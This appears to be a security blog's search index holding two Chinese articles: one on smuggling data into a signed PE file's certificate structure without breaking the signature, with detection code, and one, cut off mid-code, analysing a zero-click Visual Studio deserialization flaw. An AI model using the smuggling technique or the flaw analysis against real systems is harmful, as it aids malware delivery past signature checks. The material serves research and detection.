<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>在PE文件中嵌入数据同时保持数字签名完整及对应的检测方法</title>
    <link href="/articles/wincert/"/>
    <url>/articles/wincert/</url>
    
    <content type="html"><![CDATA[<h1 id="隐写"><a href="#隐写" class="headerlink" title="隐写"></a>隐写</h1><p>这不是什么新奇的技术，早有APT组织利用过</p><p>windows在计算PE文件的哈希时会跳过文件末尾的数字签名数据，也就是<code>WIN_CERTIFICATE</code>结构体，该结构体由可选头的安全目录指向</p><p>可以在这里下载数字签名标准文档：<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#references">https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format#references</a></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-keyword">typedef</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">_WIN_CERTIFICATE</span><br>&#123;<br>    DWORD       dwLength;<br>    WORD        wRevision;<br>    WORD        wCertificateType;   <br>    BYTE        bCertificate[ANYSIZE_ARRAY];<br>&#125; WIN_CERTIFICATE, *LPWIN_CERTIFICATE;<br></code></pre></td></tr></table></figure><p>其中，<code>dwLength</code>必须是8的整倍数，表示整个结构体的长度（包括结构体头部和它本身）</p><p>原理很简单，在数字签名末尾夹带数据，并对应调整结构体大小就行</p><p>由于<code>dwLength</code>必须是8的整倍数，所以夹带的数据长度也得是8的整倍数</p><p><img src="/articles/wincert/1.png"></p><p>然后调整结构体大小，要调整的地方有两个，一个就是文件末尾的<code>WinCertificate.dwLength</code>，还有一个可选头安全目录中的大小<code>OptionalHeader.DataDirArray[4].size</code></p><p>上文夹带了8字节数据，所以这两处地方对应增大8就行</p><p><img src="/articles/wincert/2.png"></p><p><img src="/articles/wincert/3.png"></p><p>然后保存文件，同时数字签名未失效</p><p><img src="/articles/wincert/4.png"></p><h1 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h1><p>事实上，这里还存在一个“隐式”的长度可以用来检测是否被夹带了恶意数据</p><p>可以知道：数字签名是 PKCS#7 结构，该结构的顶层是一个 SEQUENCE，整个结构都嵌套在这个顶层 SEQUENCE 中，这个顶层 SEQUENCE 的大小就是整个签名结构的大小</p><p><img src="/articles/wincert/5.png"></p><p>图中的4个字节是顶层 SEQUENCE 头（不定长），遵循TLV结构（Tag-Length-Value）</p><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">30 </span><span class="hljs-number">82</span> <span class="hljs-number">41</span> <span class="hljs-number">08</span><br></code></pre></td></tr></table></figure><p>其中，<br><code>30</code>表示这是一个 SEQUENCE 类型（Tag）<br><code>82</code>是长度前缀，表示接下来的两个字节表示长度<br><code>41 08</code>是长度，以大端序表示（Length）</p><p>也就是说，顶层 SEQUENCE 的 Value 部分有16648字节大，加上 SEQUENCE 头的4个字节、WIN_CERTIFICATE头的8个字节，填充的4字节，总长就是16664字节</p><p>16664和实际长度16672差了8字节，也就是上文夹带的数据长度</p><p>编写一个粗糙的POC代码：</p><p><img src="/articles/wincert/6.png"></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><code class="hljs C++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;filesystem&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;wintrust.h&gt;</span></span><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">hexdump</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>* data, <span class="hljs-type">size_t</span> size)</span> </span>&#123;<br><span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* ptr = (<span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>*)data;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; size; i += <span class="hljs-number">16</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08zx  &quot;</span>, i);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">16</span>; j++) &#123;<br><span class="hljs-keyword">if</span> (i + j &lt; size)<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%02x &quot;</span>, ptr[i + j]);<br><span class="hljs-keyword">else</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;   &quot;</span>);<br><span class="hljs-keyword">if</span> (j == <span class="hljs-number">7</span>) <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot; &quot;</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">16</span> &amp;&amp; i + j &lt; size; j++) &#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> c = ptr[i + j];<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%c&quot;</span>, <span class="hljs-built_in">isprint</span>(c) ? c : <span class="hljs-string">&#x27;.&#x27;</span>);<br>&#125;<br><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* pe)</span> </span>&#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n检测 %s\n&quot;</span>, pe);<br><br><span class="hljs-function">std::ifstream <span class="hljs-title">file</span><span class="hljs-params">(pe, std::ios::binary)</span></span>;<br><span class="hljs-keyword">if</span> (!file) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无法打开文件\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">auto</span> fileSize = std::filesystem::<span class="hljs-built_in">file_size</span>(pe);<br><span class="hljs-keyword">if</span> (fileSize &lt; <span class="hljs-number">200</span>) &#123; <span class="hljs-comment">//别问为什么是200，凭感觉瞎写的（笑</span><br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;非有效PE文件\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>std::unique_ptr&lt;<span class="hljs-type">char</span>[]&gt; fileBuffer = std::<span class="hljs-built_in">make_unique</span>&lt;<span class="hljs-type">char</span>[]&gt;(fileSize);<br>file.<span class="hljs-built_in">read</span>(fileBuffer.<span class="hljs-built_in">get</span>(), fileSize);<br><br>PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)fileBuffer.<span class="hljs-built_in">get</span>();<br>PIMAGE_NT_HEADERS32 nt_header_32 = (PIMAGE_NT_HEADERS32)(fileBuffer.<span class="hljs-built_in">get</span>() + dos_header-&gt;e_lfanew);<br>PIMAGE_NT_HEADERS64 nt_header_64 = (PIMAGE_NT_HEADERS64)(fileBuffer.<span class="hljs-built_in">get</span>() + dos_header-&gt;e_lfanew);<br><br><span class="hljs-keyword">if</span> (dos_header-&gt;e_magic != IMAGE_DOS_SIGNATURE ||<br>nt_header_32-&gt;Signature != IMAGE_NT_SIGNATURE) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;非有效PE文件\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>IMAGE_DATA_DIRECTORY securityDir;<br><span class="hljs-keyword">if</span> (nt_header_32-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR64_MAGIC) &#123;<br>securityDir = nt_header_64-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (nt_header_32-&gt;OptionalHeader.Magic == IMAGE_NT_OPTIONAL_HDR32_MAGIC) &#123;<br>securityDir = nt_header_32-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_SECURITY];<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;非有效PE文件\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (securityDir.VirtualAddress == <span class="hljs-number">0</span> || securityDir.Size == <span class="hljs-number">0</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;文件没有数字签名\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (securityDir.VirtualAddress + securityDir.Size &gt; fileSize) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;数字签名损坏\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">const</span> <span class="hljs-type">char</span>* securityDataStart = fileBuffer.<span class="hljs-built_in">get</span>() + securityDir.VirtualAddress;<br><span class="hljs-type">const</span> <span class="hljs-type">char</span>* securityDataEnd = securityDataStart + securityDir.Size;<br><br>LPWIN_CERTIFICATE cert = (LPWIN_CERTIFICATE)securityDataStart;<br><br><span class="hljs-comment">// 这是一个非常粗糙的ASN.1解析器，可能存在指针越界漏洞</span><br><br><span class="hljs-keyword">if</span> (cert-&gt;bCertificate[<span class="hljs-number">0</span>] != <span class="hljs-number">0x30</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;数字签名损坏\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>BYTE seq_length_tag = *(cert-&gt;bCertificate + <span class="hljs-number">1</span>);<br><span class="hljs-type">uint64_t</span> seq_length = <span class="hljs-number">0</span>;<br><br><span class="hljs-keyword">if</span> (seq_length_tag &lt;= <span class="hljs-number">0x7F</span>) &#123;<br>seq_length = seq_length_tag;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ((seq_length_tag &gt;= <span class="hljs-number">0x81</span>) &amp;&amp; (seq_length_tag &lt;= <span class="hljs-number">0x88</span>)) &#123;<br>BYTE length_bytes = seq_length_tag &amp; <span class="hljs-number">0x7F</span>;<br><span class="hljs-keyword">if</span> (length_bytes &gt; <span class="hljs-number">8</span>) &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;数字签名过长\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">const</span> BYTE* pLength = cert-&gt;bCertificate + <span class="hljs-number">2</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; length_bytes; i++) &#123;<br>seq_length = (seq_length &lt;&lt; <span class="hljs-number">8</span>) | (*pLength++);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;数字签名损坏\n&quot;</span>);<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> expected_cert_length = ((seq_length + <span class="hljs-number">4</span> + <span class="hljs-number">8</span>) + <span class="hljs-number">7</span>) / <span class="hljs-number">8</span> * <span class="hljs-number">8</span>;<br><span class="hljs-keyword">if</span> (expected_cert_length &lt; cert-&gt;dwLength) &#123;<br><span class="hljs-type">uint64_t</span> length = cert-&gt;dwLength - expected_cert_length;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;检测到数据夹带，总长 %lld 字节\n&quot;</span>, length);<br><span class="hljs-built_in">hexdump</span>(securityDataStart + expected_cert_length, length);<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未检测到数据夹带\n&quot;</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">check</span>(<span class="hljs-string">&quot;C:\\Users\\ADMIN\\Desktop\\msvcp140.dll&quot;</span>);<br><span class="hljs-built_in">check</span>(<span class="hljs-string">&quot;C:\\Users\\ADMIN\\Desktop\\msvcp140_raw.dll&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>网络安全</tag>
      
      <tag>windows</tag>
      
      <tag>逆向</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>深入解析Visual Studio反序列化零点击代码执行漏洞，实现 100% 稳定复现</title>
    <link href="/articles/vs_exploit_research/"/>
    <url>/articles/vs_exploit_research/</url>
    
    <content type="html"><![CDATA[<p>我在过去写过一篇文章（<a href="https://crackme.net/articles/resln/">https://crackme.net/articles/resln/</a> ），介绍了这个反序列化代码执行漏洞，但是懒没有深入研究，也不知道为什么不是所有项目类型都生效</p><p>今天有人来问我这个问题，只能静下心深入研究一下</p><h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>随便试几下就能发现，从最近项目中打开是能稳定利用的，但是从sln打开就分项目类型，部分项目类型不生效，部分项目类型需要用户二次操作（例如打开项目属性）</p><p><img src="/articles/vs_exploit_research/3.png"></p><p>已知漏洞存在于<code>Microsoft.VisualStudio.dll</code>中，搜索可知该dll被<code>devenv.exe</code>加载</p><p><img src="/articles/vs_exploit_research/1.png"></p><p>使用dnspy打开<code>Microsoft.VisualStudio.dll</code>，在有漏洞的位置加个断点，附加到<code>devenv.exe</code>开始调试</p><p><img src="/articles/vs_exploit_research/2.png"></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-comment">// Token: 0x06000289 RID: 649 RVA: 0x0000B23C File Offset: 0x0000943C</span><br><span class="hljs-function"><span class="hljs-keyword">internal</span> <span class="hljs-keyword">void</span> <span class="hljs-title">LoadOptions</span>(<span class="hljs-params">Stream stream</span>)</span><br>&#123;<br><span class="hljs-comment">// BinaryFormatter 反序列化漏洞点，在这里加个断点开始调试</span><br>BinaryReader binaryReader = <span class="hljs-keyword">new</span> BinaryReader(stream);<br>BinaryFormatter binaryFormatter = <span class="hljs-keyword">new</span> BinaryFormatter();<br><span class="hljs-built_in">int</span> num = binaryReader.ReadInt32();<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; num; i++)<br>&#123;<br><span class="hljs-built_in">string</span> text = binaryReader.ReadString();<br><span class="hljs-built_in">int</span> num2 = binaryReader.ReadInt32();<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> j = <span class="hljs-number">0</span>; j &lt; num2; j++)<br>&#123;<br><span class="hljs-built_in">string</span> text2 = <span class="hljs-keyword">this</span>.Links.Read(stream);<br>VsToolboxService.ToolboxItemContainer toolboxItemContainer = (VsToolboxService.ToolboxItemContainer)binaryFormatter.Deserialize(stream);<br><span class="hljs-keyword">if</span> (text2 != <span class="hljs-literal">null</span> &amp;&amp; File.Exists(text2))<br>&#123;<br>toolboxItemContainer.LinkFile = text2;<br><span class="hljs-keyword">this</span>.Links.TrackLink(text2);<br><span class="hljs-keyword">this</span>.Items.GetFilteredList(text).Add(toolboxItemContainer);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跟随调用栈来到<code>Microsoft.VisualStudio.Shell.15.0.dll!Initialize()</code></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-comment">// Token: 0x060021AA RID: 8618 RVA: 0x000545E8 File Offset: 0x000527E8</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Initialize</span>()</span><br>&#123;<br><span class="hljs-built_in">object</span> servicesLock = <span class="hljs-keyword">this</span>._servicesLock;<br><span class="hljs-keyword">lock</span> (servicesLock)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>._services != <span class="hljs-literal">null</span> &amp;&amp; <span class="hljs-keyword">this</span>._services.Count &gt; <span class="hljs-number">0</span>)<br>&#123;<br>IProfferService profferService = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">foreach</span> (KeyValuePair&lt;Type, <span class="hljs-built_in">object</span>&gt; keyValuePair <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span>._services)<br>&#123;<br>Package.ProfferedService profferedService = keyValuePair.Value <span class="hljs-keyword">as</span> Package.ProfferedService;<br><span class="hljs-keyword">if</span> (profferedService != <span class="hljs-literal">null</span>)<br>&#123;<br><span class="hljs-keyword">if</span> (profferService == <span class="hljs-literal">null</span>)<br>&#123;<br>profferService = (IProfferService)<span class="hljs-keyword">this</span>.GetService(<span class="hljs-keyword">typeof</span>(SProfferService));<br>&#125;<br><span class="hljs-keyword">if</span> (profferService == <span class="hljs-literal">null</span>)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>Guid guid = keyValuePair.Key.GUID;<br><span class="hljs-built_in">uint</span> num;<br>NativeMethods.ThrowOnFailure(profferService.ProfferService(<span class="hljs-keyword">ref</span> guid, <span class="hljs-keyword">this</span>, <span class="hljs-keyword">out</span> num));<br>profferedService.Cookie = num;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// 上面的代码不重要，从这里开始判断</span><br><span class="hljs-built_in">object</span> optionKeysLock = <span class="hljs-keyword">this</span>._optionKeysLock;<br><span class="hljs-built_in">string</span>[] array;<br><span class="hljs-keyword">lock</span> (optionKeysLock)<br>&#123;<br>List&lt;<span class="hljs-built_in">string</span>&gt; optionKeys = <span class="hljs-keyword">this</span>._optionKeys;<br>array = ((optionKeys != <span class="hljs-literal">null</span>) ? optionKeys.ToArray() : <span class="hljs-literal">null</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (array != <span class="hljs-literal">null</span>)<br>&#123;<br>IVsSolutionPersistence vsSolutionPersistence = (IVsSolutionPersistence)<span class="hljs-keyword">this</span>.GetService(<span class="hljs-keyword">typeof</span>(SVsSolutionPersistence));<br><span class="hljs-keyword">if</span> (vsSolutionPersistence != <span class="hljs-literal">null</span>)<br>&#123;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">string</span> text <span class="hljs-keyword">in</span> array)<br>&#123;<br><span class="hljs-keyword">try</span><br>&#123;<br><span class="hljs-comment">// text参数是否为&quot;VsToolboxService&quot;就是漏洞能否利用的关键</span><br><span class="hljs-built_in">int</span> num2 = vsSolutionPersistence.LoadPackageUserOpts(<span class="hljs-keyword">this</span>, text);<br><span class="hljs-keyword">if</span> (num2 == <span class="hljs-number">-2147418113</span> || num2 == <span class="hljs-number">-2147287038</span> || num2 == <span class="hljs-number">-2147467260</span>)<br>&#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>ErrorHandler.ThrowOnFailure(num2);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex)<br>&#123;<br><span class="hljs-keyword">this</span>.LogSolutionOptionsLoadFailure(text, ex);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">this</span>.ScheduleToolboxItemDiscoveryFactoriesRegistrationIfNecessary();<br>&#125;<br></code></pre></td></tr></table></figure><p>可以推测出，从最近项目中打开项目时自动设置了<code>_optionKeys;</code>为<code>VsToolboxService</code>，原理明白了接下来跟调用栈看看哪里设置了<code>_optionKeys;</code>就行</p><p>在<code>_optionKeys</code>的setter方法上打个断点，继续跟调用栈看哪个设置了<code>VsToolboxService</code></p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-comment">// Token: 0x0600219E RID: 8606 RVA: 0x00053A8C File Offset: 0x00051C8C</span><br><span class="hljs-function"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title">AddOptionKey</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> name</span>)</span><br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.zombie)<br>&#123;<br>Marshal.ThrowExceptionForHR(<span class="hljs-number">-2147418113</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (name == <span class="hljs-literal">null</span>)<br>&#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentNullException(<span class="hljs-string">&quot;name&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (name.Length &gt; <span class="hljs-number">31</span>)<br>&#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-built_in">string</span>.Format(Resources.Culture, Resources.Package_BadOptionName, name));<br>&#125;<br><span class="hljs-built_in">object</span> optionKeysLock = <span class="hljs-keyword">this</span>._optionKeysLock;<br><span class="hljs-keyword">lock</span> (optionKeysLock)<br>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>._optionKeys == <span class="hljs-literal">null</span>)<br>&#123;<br><span class="hljs-keyword">this</span>._optionKeys = <span class="hljs-keyword">new</span> List&lt;<span class="hljs-built_in">string</span>&gt;();<br>&#125;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>._optionKeys.Contains(name))<br>&#123;<br><span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> ArgumentException(<span class="hljs-built_in">string</span>.Format(Resources.Culture, Resources.Package_OptionNameUsed, name));<br>&#125;<br><br><span class="hljs-comment">// 在这里加断点</span><br><span class="hljs-keyword">this</span>._optionKeys.Add(name);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>最终跟到<code>VSCorePackage</code>，<code>VSCorePackage</code>中没有判断就直接执行了<code>base.AddOptionKey(typeof(VsToolboxService).Name);</code>，很明显，该漏洞能否零点击利用的关键就是<code>VSCorePackage()</code>是否会被零点击调用</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs C#"><span class="hljs-comment">// Token: 0x06000106 RID: 262 RVA: 0x00003B10 File Offset: 0x00001D10</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">VSCorePackage</span>()</span><br>&#123;<br>ServiceCreatorCallback serviceCreatorCallback = <span class="hljs-keyword">new</span> ServiceCreatorCallback(<span class="hljs-keyword">this</span>.OnCreateService);<br>IServiceContainer serviceContainer = <span class="hljs-keyword">this</span>.GetService(<span class="hljs-keyword">typeof</span>(IServiceContainer)) <span class="hljs-keyword">as</span> IServiceContainer;<br><span class="hljs-keyword">if</span> (serviceContainer != <span class="hljs-literal">null</span>)<br>&#123;<br>serviceContainer.AddService(<span class="hljs-keyword">typeof</span>(IVSMDPropertyBrowser), serviceCreatorCallback, <span class="hljs-literal">true</span>);<br>serviceContainer.AddService(<span class="hljs-keyword">typeof</span>(IToolboxService), serviceCreatorCallback, <span class="hljs-literal">true</span>);<br>serviceContainer.AddService(<span class="hljs-keyword">typeof</span>(IComponentDiscoveryService), serviceCreatorCallback, <span class="hljs-literal">true</span>);<br>serviceContainer.AddService(<span class="hljs-keyword">typeof</span>(IUIService), serviceCreatorCallback, <span class="hljs-literal">true</span>);<br>serviceContainer.AddService(<span 